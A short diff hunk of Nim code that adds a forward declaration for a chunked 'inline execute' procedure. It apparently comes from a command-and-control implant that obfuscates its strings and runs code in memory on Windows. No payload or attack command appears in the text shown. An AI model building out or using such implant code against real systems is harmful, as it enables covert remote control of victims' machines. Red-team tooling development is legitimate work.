@@ -221,6 +221,9 @@ when defined(windows):
 
 const CHUNK_SIZE = 512000
 
+# Forward declaration
+proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: string, totalChunks: int, currentChunk: int, fileData: var seq[byte]): JsonNode
+
 proc inlineExecute*(taskId: string, params: JsonNode): JsonNode =
   when not defined(windows):
     return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}
